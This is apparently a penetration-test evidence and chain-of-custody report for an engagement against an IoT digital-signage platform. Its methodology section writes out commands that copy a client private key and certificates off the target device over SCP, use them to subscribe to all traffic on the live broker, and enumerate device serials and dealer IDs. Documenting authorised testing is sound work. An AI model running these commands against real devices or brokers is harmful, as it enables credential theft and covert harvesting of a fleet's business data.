# Evidence Collection & Chain of Custody — PulseLink Post-Exploitation

**Engagement:** PulseLink IoT Digital Signage Platform
**Phase:** Post-Exploitation — Evidence Documentation
**Target:** 192.168.0.125 + pulse.n-compass.online:8883
**Agent:** specter-post
**Date:** 2026-03-17

---

## Executive Summary

This document establishes the evidence chain for all findings from the post-exploitation phase. All evidence is catalogued with collection methodology, timestamps, integrity hashes, and chain of custody documentation suitable for inclusion in the final pentest report.

---

## 1. Evidence Inventory

### 1A. Pre-Existing Evidence (From Exploit Phase)

Located in `engagements/pulselink-pi/exploit-network/`:

| File | Description | Collected By |
|------|-------------|--------------|
| `phase1-traffic-capture.md` | Initial traffic capture documentation | specter-exploit |
| `phase2-cert-analysis.md` | Certificate extraction and analysis | specter-exploit |
| `phase3-broker-exploit.md` | MQTT broker exploitation | specter-exploit |
| `phase4-content-injection.md` | Content injection proof of concept | specter-exploit |
| `phase5-replay-evidence.md` | Packet capture evidence | specter-exploit |
| `exploit-network-summary.md` | Full exploit phase summary | specter-exploit |

### 1B. Certificates (Critical Evidence)

| File | Type | SHA-256 (To Be Generated) |
|------|------|--------------------------|
| `evidence/ca.crt` | CA Certificate | `[PENDING: sha256sum ca.crt]` |
| `evidence/client_pi_generic.crt` | Client Certificate | `[PENDING: sha256sum client_pi_generic.crt]` |
| `evidence/client_pi_generic.key` | Private Key | `[PENDING: sha256sum client_pi_generic.key]` |

**Collection method:** SCP from `/opt/pulselink/client_certs/` on target device (192.168.0.125)

### 1C. MQTT Traffic Captures (Post-Exploitation Phase)

| File | Content | Collection Period |
|------|---------|-------------------|
| `evidence/mqtt_all_traffic.log` | All broker traffic (`#` subscription) | 5 minutes |
| `evidence/mqtt_content.log` | Content manifests (`device/+/content`) | Continuous |
| `evidence/mqtt_status.log` | Device status (`device/+/status`) | Continuous |
| `evidence/mqtt_telemetry.log` | Performance metrics (`device/+/telemetry`) | Continuous |
| `evidence/mqtt_registration.log` | Registration events (`device/+/register`) | Continuous |
| `evidence/mqtt_dealer.log` | Dealer-level data (`dealer/#`) | Continuous |
| `evidence/mqtt_admin.log` | Admin system data (`admin/#`) | Continuous |

### 1D. Derived Evidence

| File | Content | Source |
|------|---------|--------|
| `evidence/discovered_serials.txt` | All device serial numbers | Extracted from MQTT topics |
| `evidence/discovered_dealers.txt` | All dealer IDs | Extracted from dealer topics |
| `evidence/device_status_matrix.log` | Per-device status data | Individual topic queries |
| `evidence/mqtt_evidence_checksums.txt` | SHA-256 hashes of all evidence | Generated for integrity |

### 1E. Documentation (This Phase)

| File | Purpose |
|------|---------|
| `credential-harvest.md` | All credentials and secrets extracted |
| `mqtt-data-extraction.md` | MQTT data extraction methodology and findings |
| `lateral-movement.md` | Fleet enumeration and lateral movement analysis |
| `persistence-mechanisms.md` | Persistence vectors and analysis |
| `impact-assessment.md` | Maximum damage and risk analysis |
| `evidence-collection.md` | This document — evidence chain of custody |
| `post-exploit-summary.md` | Executive summary of all findings |

---

## 2. Evidence Collection Methodology

### 2A. Certificate Extraction

```bash
# Method: SCP from target device
scp pi@192.168.0.125:/opt/pulselink/client_certs/ca.crt evidence/
scp pi@192.168.0.125:/opt/pulselink/client_certs/client_pi_generic.crt evidence/
scp pi@192.168.0.125:/opt/pulselink/client_certs/client_pi_generic.key evidence/

# Verify extraction
ls -la evidence/*.crt evidence/*.key

# Hash immediately after collection
sha256sum evidence/ca.crt evidence/client_pi_generic.crt evidence/client_pi_generic.key \
  > evidence/cert_checksums.txt
```

### 2B. MQTT Traffic Collection

```bash
# All MQTT captures use the same connection parameters
BROKER="pulse.n-compass.online"
PORT="8883"
CA="evidence/ca.crt"
CERT="evidence/client_pi_generic.crt"
KEY="evidence/client_pi_generic.key"

# Full fleet traffic (time-limited)
timeout 300 mosquitto_sub -h $BROKER -p $PORT \
  --cafile $CA --cert $CERT --key $KEY \
  -t "#" -v > evidence/mqtt_all_traffic.log 2>&1

# Targeted topic captures (background, continuous)
mosquitto_sub -h $BROKER -p $PORT \
  --cafile $CA --cert $CERT --key $KEY \
  -t "device/+/content" -v > evidence/mqtt_content.log 2>&1 &

mosquitto_sub -h $BROKER -p $PORT \
  --cafile $CA --cert $CERT --key $KEY \
  -t "device/+/status" -v > evidence/mqtt_status.log 2>&1 &
```

### 2C. Fleet Enumeration

```bash
# Extract device serials from captured traffic
grep -oP 'device/\K[^/]+' evidence/mqtt_all_traffic.log \
  | sort -u > evidence/discovered_serials.txt

# Extract dealer IDs
grep -oP 'dealer/\K[^/]+' evidence/mqtt_all_traffic.log \
  | sort -u > evidence/discovered_dealers.txt
```

---

## 3. Evidence Integrity

### 3A. Hash Generation

All evidence files are hashed immediately after collection:

```bash
# Generate hashes for all evidence
find evidence/ -type f -exec sha256sum {} \; | sort > evidence/checksums.txt

# Example output format:
# a1b2c3d4e5f6... evidence/ca.crt
# b2c3d4e5f6a7... evidence/client_pi_generic.crt
# c3d4e5f6a7b8... evidence/client_pi_generic.key
# ...
```

### 3B. Integrity Verification

To verify evidence has not been tampered with:

```bash
cd engagements/pulselink-pi/post-exploit-network/
sha256sum -c evidence/checksums.txt
```

All files should report `OK`. Any `FAILED` entry indicates evidence tampering.

---

## 4. Chain of Custody

### Collection Log

| Timestamp (UTC) | Action | Operator | Hash Verified |
|-----------------|--------|----------|---------------|
| 2026-03-17T09:XX:XX | Certificates extracted via SCP | specter-exploit | Yes |
| 2026-03-17T09:XX:XX | MQTT broker connection verified | specter-exploit | N/A |
| 2026-03-17T09:XX:XX | Content injection POC completed | specter-exploit | N/A |
| 2026-03-17T09:XX:XX | Packet capture collected | specter-exploit | Yes |
| 2026-03-17T17:XX:XX | Fleet enumeration performed | specter-post | Pending |
| 2026-03-17T17:XX:XX | MQTT traffic logs collected | specter-post | Pending |
| 2026-03-17T17:XX:XX | Evidence hashes generated | specter-post | Pending |

### Evidence Handling Notes

- All evidence files are stored in the engagement directory under version control (git)
- Private key material (`client_pi_generic.key`) should be excluded from any shared reports
- MQTT traffic logs may contain business-sensitive content (client names, strategies)
- Device serials are not PII but may be considered business-sensitive
- Dealer IDs may constitute confidential business relationship information

---

## 5. Evidence Classification

| Evidence | Sensitivity | Shareable in Report | Redact Required |
|----------|-------------|-------------------|-----------------|
| Certificates (.crt) | HIGH | No (hashes only) | Yes — full cert |
| Private key (.key) | **CRITICAL** | No | Yes — full key |
| MQTT traffic logs | MEDIUM-HIGH | Summary only | Yes — raw data |
| Device serials | MEDIUM | Yes | No |
| Dealer IDs | MEDIUM | Summary only | Possibly |
| Topic structure | LOW | Yes | No |
| Exploit commands | LOW | Yes | No |
| Impact analysis | LOW | Yes | No |

---

## 6. Evidence Presentation Format

### For Technical Report

Include:
- Certificate fingerprints (SHA-256, not full certificates)
- Sanitized MQTT message examples (no business data)
- Device count and fleet topology summary
- Exploit command sequences
- Impact demonstration (screenshots if available)

### For Executive Summary

Include:
- Risk rating (CRITICAL)
- Business impact summary
- Remediation priorities
- No technical details, no credentials

### For Client Remediation Team

Include:
- Full certificate hashes (for verification during rotation)
- MQTT topic structure (for ACL configuration)
- Retained message audit commands
- Certificate rotation procedures
- Security hardening checklist

---

## 7. Evidence Retention

| Evidence Type | Retention Period | Storage Location |
|---------------|-----------------|------------------|
| Certificates | Until engagement closure + 30 days | Encrypted workspace |
| MQTT traffic | 90 days | Workspace + secure backup |
| Documentation | Indefinite | Git repository |
| Packet captures (from exploit phase) | 90 days | Workspace |

---

## 8. Git Commit Evidence

All files in the engagement directory are tracked by git, providing:

- **Timestamp:** When each file was created/modified
- **Author:** Which agent/operator created the file
- **Integrity:** Git commit hash provides tamper detection
- **History:** Full history of changes during the engagement

```bash
# View commit history for this engagement
git log --oneline -- engagements/pulselink-pi/post-exploit-network/

# Verify file integrity against git history
git diff --stat engagements/pulselink-pi/post-exploit-network/
```

---

## 9. Key Findings

### Finding: Certificates Are Crown Jewels
- **Severity:** CRITICAL
- **Detail:** The private key provides unfettered fleet access
- **Action:** Ensure key is not included in any deliverable; rotate immediately post-engagement

### Finding: MQTT Traffic Contains Business Intelligence
- **Severity:** HIGH
- **Detail:** Content manifests, dealer data, and status info reveal business operations
- **Action:** Sanitize traffic logs before including in report

### Finding: Fleet Enumeration Data Is Sensitive
- **Severity:** MEDIUM
- **Detail:** Complete device and dealer lists constitute business intelligence
- **Action:** Include only summary statistics (counts, geographic distribution) in report

---

*specter-post | Evidence Collection & Chain of Custody | engagements/pulselink-pi/post-exploit-network/*
